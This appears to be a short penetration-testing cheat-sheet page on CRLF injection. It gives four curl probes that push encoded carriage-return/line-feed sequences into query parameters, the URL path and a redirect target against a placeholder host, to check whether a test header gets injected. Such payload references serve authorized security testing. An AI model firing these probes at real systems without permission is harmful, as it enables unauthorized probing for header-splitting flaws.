---
hide:
  - toc
---
# CRLF Injection

Header-splitting and response-injection probes.

<div class="ol-section-kicker"><span>WEB</span><strong>CRLF</strong></div>

## Encoded CRLF in query
```bash
curl -skD - 'https://<TARGET>/redirect?next=%0d%0aX-Test:%20crlf'
```
**Tool:** curl · **Platform:** Any · **Tags:** CRLF, Headers · **Context:** No auth · **Noise:** Moderate

## Double-encoded CRLF
```bash
curl -skD - 'https://<TARGET>/redirect?next=%250d%250aX-Test%253a%2520crlf'
```
**Tool:** curl · **Platform:** Any · **Tags:** CRLF, Encoding · **Context:** No auth · **Noise:** Moderate

## Path CRLF
```bash
curl -skD - 'https://<TARGET>/%0d%0aX-Test:%20crlf'
```
**Tool:** curl · **Platform:** Any · **Tags:** CRLF, Path · **Context:** No auth · **Noise:** Moderate

## Location-header target
```bash
curl -skD - 'https://<TARGET>/redirect?url=https://example.com%0d%0aX-Test:%20crlf'
```
**Tool:** curl · **Platform:** Any · **Tags:** Redirect, CRLF · **Context:** No auth · **Noise:** Moderate

**Related:** [Open Redirect](open-redirect.md) · [CORS, CSRF & Headers](cors-csrf-headers.md) · [Host Header Injection](host-header.md)
